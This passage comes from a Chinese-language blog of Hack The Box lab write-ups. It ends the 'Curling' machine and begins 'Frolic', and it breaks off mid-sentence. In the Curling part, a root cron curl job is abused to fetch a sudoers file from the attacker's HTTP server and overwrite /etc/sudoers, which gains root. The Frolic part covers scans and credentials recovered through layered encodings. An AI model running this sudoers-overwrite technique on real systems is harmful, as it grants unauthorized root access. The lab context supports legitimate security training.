class=\"container\">\n                        <!-- Header -->\n                        <header class=\"header\" role=\"banner\">\n                                <div class=\"header-inner clearfix\">\n                                        <a class=\"brand pull-left\" href=\"/\">\n                                                <span class=\"site-title\" title=\"Cewl Curling site!\">Cewl Curling site!</span>                                                                                   </a>\n                                        <div class=\"header-search pull-right\">\n\n                                        </div>\n                                </div>\n                        </header>\n\n                        <div class=\"row-fluid\">\n                                                                <main id=\"content\" role=\"main\" class=\"span9\">\n                                        <!-- Begin Content -->\n\n                                        <div id=\"system-message-container\">\n        </div>\n\n                                        <div class=\"blog-featured\" itemscope itemtype=\"https://schema.org/Blog\">\n<div class=\"page-header\">\n        <h1>\n        Home    </h1>\n</div>\n\n<div class=\"items-leading clearfix\">\n                        <div class=\"leading-0 clearfix\"\n                        itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/3-what-s-the-object-of-curling\" itemprop=\"url\">\n                        What's the object of curling?           </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-3\" aria-label=\"User tools\"\n                                data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-3\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/3-what-s-the-object-of-curling?tmpl=component&print=1\" title=\"Print article < What's the object of curling? >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                 <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:54:21+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:5\" />\n                                        Hits: 5                 </dd>                                           </dl>\n\n<p>Good question. First, let's get a bit of the jargon down. The playing surface in curling is called \"the sheet.\" Sheet dimensions can vary, but they're usually around 150 feet long by about 15 feet wide. The sheet is covered with tiny droplets of water that become ice and cause the stones to \"curl,\" or deviate from a straight path. These water droplets are known as \"pebble.\"</p>\n\n                </div>\n                        </div>\n\n                <div class=\"items-row cols-3 row-0 row-fluid\">\n                                        <div class=\"item column-1 span4\"\n                                itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/2-curling-you-know-its-true\" itemprop=\"url\">\n                        Curling you know its true!              </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-2\" aria-label=\"User tools\"\n                                data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-2\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/2-curling-you-know-its-true?tmpl=component&print=1\" title=\"Print article < Curling you know its true! >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                    <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:53:17+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:4\" />\n                                        Hits: 4                 </dd>                                           </dl>\n\n<p>Curling is absolutely the best sport to watch on television, particularly for viewers looking for an escape from the frantic \"more, faster, bigger, higher\" grind of most televised games. Watching basketball or hockey can get you so hyped up, you feel like drinking a Red Bull and doing jumping jacks. Watching curling makes you want to drink a glass of red wine and lie down on the shag carpet. Curling is deliberate. Thoughtful, even. The games move very slowly. The players spend a lot of time talking strategy. There are nods and quiet words of encouragement; rarely are there disagreements. When it comes time for a team member to play their turn by sliding a stone down the ice, the moves are elegant. There's a wind up, a push-off, a slide, and a gentle release. Such poise and finesse!</p>\n\n                        </div>\n\n                                        <div class=\"item column-2 span4\"\n                                itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/1-first-post-of-curling2018\" itemprop=\"url\">\n                        My first post of curling in 2018!               </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-1\" aria-label=\"User tools\"\n                                data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                                        <span class=\"icon-cog\" aria-hidden=\"true\"></span>\n                                        <span class=\"caret\" aria-hidden=\"true\"></span>\n                                </button>\n                                                                <ul class=\"dropdown-menu\" aria-labelledby=\"dropdownMenuButton-1\">\n                                                                                        <li class=\"print-icon\"> <a href=\"/index.php/2-uncategorised/1-first-post-of-curling2018?tmpl=component&print=1\" title=\"Print article < My first post of curling in 2018! >\" onclick=\"window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;\" rel=\"nofollow\">                     <span class=\"icon-print\" aria-hidden=\"true\"></span>\n                Print   </a> </li>\n                                                                                                                                                        </ul>\n                        </div>\n\n        </div>\n\n                        <dl class=\"article-info muted\">\n\n                        <dt class=\"article-info-term\">\n                                                                        Details                                                 </dt>\n\n                                                        <dd class=\"createdby\" itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n                                        Written by <span itemprop=\"name\">Super User</span>      </dd>\n\n                                                                                <dd class=\"category-name\">\n                                                                                                                                                Category: <a href=\"/index.php/2-uncategorised\" itemprop=\"genre\">Uncategorised</a>                                                  </dd>\n\n                                                                                <dd class=\"published\">\n                                <span class=\"icon-calendar\" aria-hidden=\"true\"></span>\n                                <time datetime=\"2018-05-22T18:51:53+00:00\" itemprop=\"datePublished\">\n                                        Published: 22 May 2018                          </time>\n                        </dd>\n\n                                                                                <dd class=\"hits\">\n                                        <span class=\"icon-eye-open\" aria-hidden=\"true\"></span>\n                                        <meta itemprop=\"interactionCount\" content=\"UserPageVisits:4\" />\n                                        Hits: 4                 </dd>                                           </dl>\n\n<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>\n<p>- Floris</p>\n\n                        </div>\n\n                </div>\n\n</div>\n\n                                        <div class=\"clearfix\"></div>\n\n<ul itemscope itemtype=\"https://schema.org/BreadcrumbList\" class=\"breadcrumb\">\n                        <li>\n                        You are here:  \n                </li>\n\n                                <li itemprop=\"itemListElement\" itemscope itemtype=\"https://schema.org/ListItem\" class=\"active\">\n                                <span itemprop=\"name\">\n                                        Home                            </span>\n                                <meta itemprop=\"position\" content=\"1\">\n                        </li>\n                </ul>\n\n                                        <!-- End Content -->\n                                </main>\n                                                                        <div id=\"aside\" class=\"span3\">\n                                                <!-- Begin Right Sidebar -->\n                                                <div class=\"well _menu\"><h3 class=\"page-header\">Main Menu</h3><ul class=\"nav menu\">\n<li class=\"item-101 default current active\"><a href=\"/index.php\" >Home</a></li></ul>\n</div><div class=\"well \"><h3 class=\"page-header\">Login Form</h3><form action=\"/index.php\" method=\"post\" id=\"login-form\" class=\"form-inline\">\n                <div class=\"userdata\">\n                <div id=\"form-login-username\" class=\"control-group\">\n                        <div class=\"controls\">\n                                                                        <div class=\"input-prepend\">\n                                                <span class=\"add-on\">\n                                                        <span class=\"icon-user hasTooltip\" title=\"Username\"></span>\n                                                        <label for=\"modlgn-username\" class=\"element-invisible\">Username</label>\n                                                </span>\n                                                <input id=\"modlgn-username\" type=\"text\" name=\"username\" class=\"input-small\" tabindex=\"0\" size=\"18\" placeholder=\"Username\" />\n                                        </div>\n                                                        </div>\n                </div>\n                <div id=\"form-login-password\" class=\"control-group\">\n                        <div class=\"controls\">\n                                                                        <div class=\"input-prepend\">\n                                                <span class=\"add-on\">\n                                                        <span class=\"icon-lock hasTooltip\" title=\"Password\">\n                                                        </span>\n                                                                <label for=\"modlgn-passwd\" class=\"element-invisible\">Password                                                   </label>\n                                                </span>\n                                                <input id=\"modlgn-passwd\" type=\"password\" name=\"password\" class=\"input-small\" tabindex=\"0\" size=\"18\" placeholder=\"Password\" />\n                                        </div>\n                                                        </div>\n                </div>\n                                                <div id=\"form-login-remember\" class=\"control-group checkbox\">\n                        <label for=\"modlgn-remember\" class=\"control-label\">Remember Me</label> <input id=\"modlgn-remember\" type=\"checkbox\" name=\"remember\" class=\"inputbox\" value=\"yes\"/>\n                </div>\n                                <div id=\"form-login-submit\" class=\"control-group\">\n                        <div class=\"controls\">\n                                <button type=\"submit\" tabindex=\"0\" name=\"Submit\" class=\"btn btn-primary login-button\">Log in</button>\n                        </div>\n                </div>\n                                        <ul class=\"unstyled\">\n                                                        <li>\n                                        <a href=\"/index.php/component/users/?view=remind&Itemid=101\">\n                                        Forgot your username?</a>\n                                </li>\n                                <li>\n                                        <a href=\"/index.php/component/users/?view=reset&Itemid=101\">\n                                        Forgot your password?</a>\n                                </li>\n                        </ul>\n                <input type=\"hidden\" name=\"option\" value=\"com_users\" />\n                <input type=\"hidden\" name=\"task\" value=\"user.login\" />\n                <input type=\"hidden\" name=\"return\" value=\"aHR0cDovLzEyNy4wLjAuMS8=\" />\n                <input type=\"hidden\" name=\"e6b8a82d84a03e7e05d6452f52f975f7\" value=\"1\" />       </div>\n        </form>\n</div>\n                                                <!-- End Right Sidebar -->\n                                        </div>\n                                                        </div>\n                </div>\n        </div>\n        <!-- Footer -->\n        <footer class=\"footer\" role=\"contentinfo\">\n                <div class=\"container\">\n                        <hr />\n\n                        <p class=\"pull-right\">\n                                <a href=\"#top\" id=\"back-top\">\n                                        Back to Top                             </a>\n                        </p>\n                        <p>\n                                © 2022 Cewl Curling site!                  </p>\n                </div>\n        </footer>\n\n</body>\n      <!-- secret.txt -->\n</html>\n```\n有点没明白这是什么意思，但是 input 提示本地 URL 地址，我们还是去请求一下试试吧\n\n```bash\ncurl http://127.0.0.1\n```\n然后返回的是 report 的内容，也是首页的内容\n\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 06:55 input\n-rw-rw---- 1 root   floris 14236 Apr 28 06:55 report\n```\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 07:02 input\n-rw-rw---- 1 root   floris 14236 Apr 28 07:02 report\n```\n对比一下，发现这两个文件一直在被刷新或者说写入内容\n\n运行一下 pspy64 看看\n\n```bash\n2022/04/28 07:16:01 CMD: UID=0    PID=16262  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:16:01 CMD: UID=0    PID=16261  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input \n2022/04/28 07:16:01 CMD: UID=0    PID=16260  | /usr/sbin/CRON -f \n2022/04/28 07:16:01 CMD: UID=0    PID=16259  | /usr/sbin/CRON -f \n2022/04/28 07:16:01 CMD: UID=0    PID=16264  | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:16:13 CMD: UID=0    PID=16266  | \n2022/04/28 07:17:01 CMD: UID=0    PID=16274  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report \n2022/04/28 07:17:01 CMD: UID=0    PID=16272  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report\n```\n我们可以看到，这个 curl 每隔几秒就会运行一下，那咱们是可以在 /home/floris/admin-area/input 中写入恶意内容，以 Getshell\n\n在本地构造一个恶意 exploit 文件\n\n```bash\n┌──(root💀kali)-[/opt/tools]\n└─# cat exploit                       \nroot    ALL=(ALL:ALL) ALL\nfloris  ALL=(ALL:ALL) ALL\n```\n然后使用 python3 开启一个 HTTP 服务器\n\n```bash\npython3 -m http.server 80\n```\n接着在靶机中执行下面的命令\n\n```bash\necho -e 'url = \"http://10.10.16.12/exploit\"\\noutput = \"/etc/sudoers\"' > input\n```\n然后等着就行\n\n```bash\n┌──(root💀kali)-[/opt/tools]\n└─# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.10.150 - - [28/Apr/2022 03:23:03] \"GET /exploit HTTP/1.1\" 200 -\n```\n等我们这边的 HTTP 服务出现请求以后，就是修改成功了\n\n接着使用 sudo su 切换到 root 用户，密码还是 floris 用户的密码\n\n```bash\nfloris@curling:~/admin-area$ sudo su\n[sudo] password for floris: \nroot@curling:/home/floris/admin-area# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\nroot@curling:/home/floris/admin-area# cat /root/root.txt\n82c198ab6fc5365fdc6da2ee5c26064a\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Frolic - Hackthebox","url":"/2022/04/27/Hackthebox/Easy/Hackthebox-Frolic/","content":"\n# Hackthebox - Frolic\n# 靶场信息\n![](Hackthebox-Frolic/15bf4abf-f6b0-412a-ba23-dad74aff6b53.png)\n\n# 靶场类型\n![](Hackthebox-Frolic/c129ddea-5e6c-40e7-a63c-68436fb3f2ae.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.111\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-25 21:22 EDT\nNmap scan report for 10.10.10.111\nHost is up (0.32s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)\n|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)\n|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n1880/tcp open  http        Node.js (Express middleware)\n|_http-title: Node-RED\n9999/tcp open  http        nginx 1.10.3 (Ubuntu)\n|_http-server-header: nginx/1.10.3 (Ubuntu)\n|_http-title: Welcome to nginx!\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/25%OT=22%CT=1%CU=38693%PV=Y%DS=2%DC=T%G=Y%TM=626749B\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W2=\nOS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s\n|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\n|   Computer name: frolic\n|   NetBIOS computer name: FROLIC\\x00\n|   Domain name: \\x00\n|   FQDN: frolic\n|_  System time: 2022-04-26T06:53:50+05:30\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2022-04-26T01:23:52\n|_  start_date: N/A\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   323.74 ms 10.10.14.1\n2   318.95 ms 10.10.10.111\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.58 seconds\n```\n## Http\n### 1880\n![](Hackthebox-Frolic/114015ca-97a4-4bf8-aa0e-2aeb1cdc21d0.png)\n\n尝试了一下，admin/admin 会登录失败，但 admin/password 会提示超时，有点奇怪，fuzz 了一下没什么东西，先放着\n\n### 9999\n![](Hackthebox-Frolic/dd8854d8-4551-4982-a672-63d404c4a92f.png)\n\n## Smb\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# smbmap -H 10.10.10.111                                              \n[+] Guest session       IP: 10.10.10.111:445    Name: 10.10.10.111                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))\n```\nsmb 扫了一下，也没什么东西\n\n## Fuzz\n### 1880\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.111:1880/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.111:1880/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/25 21:56:22 Starting gobuster in directory enumeration mode\n===============================================================\n/icons                (Status: 401) [Size: 12]\n/red                  (Status: 301) [Size: 173] [--> /red/]\n/vendor               (Status: 301) [Size: 179] [--> /vendor/]\n/settings             (Status: 401) [Size: 12]                \n/Icons                (Status: 401) [Size: 12]                \n/nodes                (Status: 401) [Size: 12]                \n/SETTINGS             (Status: 401) [Size: 12]                \n/flows                (Status: 401) [Size: 12]                \n/ICONS                (Status: 401) [Size: 12]                \n\n===============================================================\n2022/04/25 22:03:47 Finished\n===============================================================\n```\nfuzz 了一下，没东西，继续放着吧\n\n### 9999\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.111:9999/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/25 21:52:59 Starting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]\n/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/] \n/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]  \n/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]\n/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]  \n\n===============================================================\n2022/04/25 22:00:19 Finished\n===============================================================\n```\n我感觉突破口就在这边了\n\n![](Hackthebox-Frolic/94b7e198-05c8-43d9-ac74-d5285f5baac2.png)\n\nadmin 目录是一个登录页面，先看看其他的\n\n![](Hackthebox-Frolic/4d13dbba-a3cf-4781-894a-9043cb9cd782.png)\n\ntest 目录是一个 phpinfo 有点意思\n\n![](Hackthebox-Frolic/31decdeb-4271-4830-a62d-c05046668c95.png)\n\nbackup 里有两个文件一个目录，看着像是账号密码\n\n```bash\nusername = admin\npassword = imnothuman\n```\n得到了一个账号密码，那个目录 403 进不去\n\n咱们去登录一下看看\n\n![](Hackthebox-Frolic/d64e0214-8cce-4c33-81d7-d3b9840e1e42.png)\n\n这边提示登录失败，那会不会是在 1880 登录呢？\n\n![](Hackthebox-Frolic/bc154a9d-4387-445a-9732-d453239687fd.png)\n\n也登录失败，有点奇怪\n\n> [http://10.10.10.111:9999/admin/js/login.js](http://10.10.10.111:9999/admin/js/login.js)\n\n```bash\nvar attempt = 3; // Variable to count number of attempts.\n// Below function Executes on click of login button.\nfunction validate(){\nvar username = document.getElementById(\"username\").value;\nvar password = document.getElementById(\"password\").value;\nif ( username == \"admin\" && password == \"superduperlooperpassword_lol\"){\nalert (\"Login successfully\");\nwindow.location = \"success.html\"; // Redirecting to other page.\nreturn false;\n}\nelse{\nattempt --;// Decrementing by one.\nalert(\"You have left \"+attempt+\" attempt;\");\n// Disabling fields after 3 attempts.\nif( attempt == 0){\ndocument.getElementById(\"username\").disabled = true;\ndocument.getElementById(\"password\").disabled = true;\ndocument.getElementById(\"submit\").disabled = true;\nreturn false;\n}\n}\n}\n```\n查看源代码的时候找到了一个密码，啊这？\n\n```bash\nusername = admin\npassword = superduperlooperpassword_lol\n```\n# 漏洞利用\n> [http://10.10.10.111:9999/admin/success.html](http://10.10.10.111:9999/admin/success.html)\n\n```bash\nn```\n登录后进入了这个页面，拿到了一堆奇奇怪怪的字符，像是某种加密，尝试解密一下看看\n\n我搜了一下资料，这个编程语言叫做 Okk，我找到了一个这种语言的解密网站\n\n> [https://esolangs.org/wiki/ook](https://esolangs.org/wiki/ook)!\n\n> [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language)\n\n```bash\nNothing here check /asdiSIAJJ0QWE9JAS\n```\n继续去访问一下\n\n> [http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/](http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/)\n\n```bash\nUEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA\n```\n似乎拿到了一段 BASE64 编码\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d                    \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   487    0   487    0     0    749      0 --:--:-- --:--:-- --:--:--   749\nPK     É7M#�[�i index.phpUT     �|�[�|�[ux\n                                          ^D�J�s�h�)�P�n\n                                                        ��Ss�Jw▒܎��4��k�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8�����J2S�*�DЍ}�8dTQk������j_���▒���'xc��ݏt��75Q�\n                                                                                                                                                       ���k,4��b)�4F��  ���������&q2o�WԜ�9P#�[�iPK     É7M#�[�i ▒��index.phpUT�|�[ux\n                 PKO\n```\n解密后得到了一些乱码输出，有点奇怪，尝试给他写出到文件，然后查看下类型呢\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d > file\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   487    0   487    0     0    748      0 --:--:-- --:--:-- --:--:--   749\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# file file      \nfile: Zip archive data, at least v2.0 to extract\n```\n这是一个 zip 的压缩文件，去更改下后缀然后尝试解压\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# mv file file.zip\n\n┌──(root💀kali)-[~/Desktop]\n└─# unzip file.zip            \nArchive:  file.zip\n[file.zip] index.php password: \n   skipping: index.php               incorrect password\n```\n有解压密码，随手尝试几个弱口令试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# unzip file.zip \nArchive:  file.zip\n[file.zip] index.php password: \n  inflating: index.php\n```\n解压密码是 password，成功解压出来一个 index.php 文件\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat index.php \n4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a\n```\n这又是编码。。。\n\n这应该是十六进制编码，我们去解密一下\n\n> [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\n\n![](Hackthebox-Frolic/86c652c4-b79f-4c03-82ce-dd25ea9d33f3.png)\n\n出来后是 base64 编码，咱们再解密一重\n\n![](Hackthebox-Frolic/1917a7b9-6a7e-491f-bc96-6606fc0e9457.png)\n\n```bash\n+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+\n++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---\n<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>\n++..<\n```\n这是次 brainfuck，咱们去解密一下\n\n> [https://sange.fi/esoteric/brainfuck/impl/interp/i.html](https://sange.fi/esoteric/brainfuck/impl/interp/i.html)\n\n```bash\nusername = admin\npassword = idkwhatispass\n```\n![](Hackthebox-Frolic/3d87af17-a524-4cdf-b36a-052e4bd733b3.png)\n\n在 /dev/backup 中提示有一个 